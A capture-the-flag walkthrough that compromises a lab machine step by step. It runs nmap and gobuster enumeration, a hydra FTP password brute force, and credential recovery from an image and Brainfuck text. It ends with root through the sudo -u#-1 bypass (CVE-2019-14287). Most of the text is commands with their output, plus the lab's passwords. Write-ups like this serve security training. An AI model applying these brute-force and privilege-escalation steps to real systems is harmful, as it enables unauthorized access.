1. Scan the machine

	$$ nmap -sV -sC 10.10.143.82 -oN nmap

	==> PORT   STATE SERVICE VERSION

		21/tcp open  ftp     vsftpd 3.0.2

		22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
		| ssh-hostkey: 
		|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
		|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
		|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
		|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)

		80/tcp open  http    Apache httpd 2.4.10 ((Debian))
		|_http-server-header: Apache/2.4.10 (Debian)
		|_http-title: Apache2 Debian Default Page: It works

		Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

2. Serach for hidden directories

	$$ gobuster dir -u http://10.10.143.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

	==> /assets               (Status: 301) [Size: 313] [--> http://10.10.143.82/assets/]


	## Check the '/assets' directory:

	==> Found: RickRolled.mp4 [Nothing Suspicious]
			   style.css      [Found a comment: /* Nice to see someone checking the stylesheets.Take a look at the 					page: /sup3r_s3cr3t_fl4g.php*/]


	## Check the '/sup3r_s3cr3t_fl4g.php' page:

	==> It redirects to youtube [get rid of redirection by burpsuit]:

			1. capture the request
			2. We found a hidden directory [GET /intermediary.php?hidden_directory=/WExYY2Cv-qU]
			3. Lastly found an image [Hot_Babe.png]

3. Enumerate the image

	$$ strings Hot_Babe.png

	==> Eh, you've earned this. Username for FTP is ftpuser
		One of these is the password:
		
	## We found the username for the ftp

	## save all text after line "One of these is the password:" in a 'wordlists.txt' file.

4. Enumerating FTP server

	$$ hydra ftp://10.10.143.82 -l ftpuser -P wordlist.txt -V -f

	==> Password: 5iez1wGXKfPKQ

		## login into ftp using:

		## User: ftpuser
		## password: 5iez1wGXKfPKQ


	## we found "Eli's_Creds.txt" file

	$$ cat "Eli's_Creds.txt"

	==> +++++ ++++[ ->+++ +++++ +<]>+ +++.< +++++ [->++ +++<] >++++ +.<++ +[->-
		--<]> ----- .<+++ [->++ +<]>+ +++.< +++++ ++[-> ----- --<]> ----- --.<+
		++++[ ->--- --<]> -.<++ +++++ +[->+ +++++ ++<]> +++++ .++++ +++.- --.<+
		+++++ +++[- >---- ----- <]>-- ----- ----. ---.< +++++ +++[- >++++ ++++<
		]>+++ +++.< ++++[ ->+++ +<]>+ .<+++ +[->+ +++<] >++.. ++++. ----- ---.+
		++.<+ ++[-> ---<] >---- -.<++ ++++[ ->--- ---<] >---- --.<+ ++++[ ->---
		--<]> -.<++ ++++[ ->+++ +++<] >.<++ +[->+ ++<]> +++++ +.<++ +++[- >++++
		+<]>+ +++.< +++++ +[->- ----- <]>-- ----- -.<++ ++++[ ->+++ +++<] >+.<+
		++++[ ->--- --<]> ---.< +++++ [->-- ---<] >---. <++++ ++++[ ->+++ +++++
		<]>++ ++++. <++++ +++[- >---- ---<] >---- -.+++ +.<++ +++++ [->++ +++++
		<]>+. <+++[ ->--- <]>-- ---.- ----. <


		## This is a language called brainf*ck

	## Go to: https://www.dcode.fr/brainfuck-language

	==> User: eli
		Password: DSpDiM1wAEwid

5. SSH into machine

	$$ ssh eli@10.10.143.82 [Using the cracked password]

	## we can see a banner after login it says "Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

	$$ locate user.txt

	==> /home/gwendoline/user.txt

	$$ cat /home/gwendoline/user.txt

	==> cat: user.txt: Permission denied

	## So we have to escalate our privilages to get the user.txt


6. Horizontal Privilege Escalation

	## Acording to the Banner of ssh:

	$$ locate s3cr3t

	==> /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

	$$ cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!

	==> Your password is awful, Gwendoline. 
		It should be at least 60 characters long! Not just MniVCQVhQHUNI
		Honestly!

		Yours sincerely
		   -Root

		## So login credentials are:

			* Username: gwendoline
			* Password: MniVCQVhQHUNI

	$$ su gwendoline [Use above password]

	==> we are now gwendoline user.


7. Vertical Privilege Escalation

	$$ sudo -l

	==> (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt	
                ||
                \/
	## this is a vulnerability (CVE-2019-14287)

	## This bug is fixed in Sudo version 1.8.28 [Check virsion: sudo -V]


	$$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt

## We are now root...